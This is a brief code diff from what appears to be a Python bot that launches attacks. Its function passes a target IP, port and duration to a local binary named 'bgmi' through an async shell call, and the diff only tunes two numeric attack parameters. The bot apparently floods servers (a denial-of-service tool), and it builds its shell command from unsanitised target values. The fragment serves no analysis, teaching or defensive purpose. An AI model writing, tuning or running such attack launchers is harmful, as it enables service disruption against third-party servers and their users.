@@ -145,7 +145,7 @@ def process_attack_command(message):
 async def run_attack_command_async(target_ip, target_port, duration):
     try:
         process = await asyncio.create_subprocess_shell(
-            f"./bgmi {target_ip} {target_port} {duration} {9} {900}",
+            f"./bgmi {target_ip} {target_port} {duration} {13} {600}",
             stdout=asyncio.subprocess.PIPE,
             stderr=asyncio.subprocess.PIPE,
         )
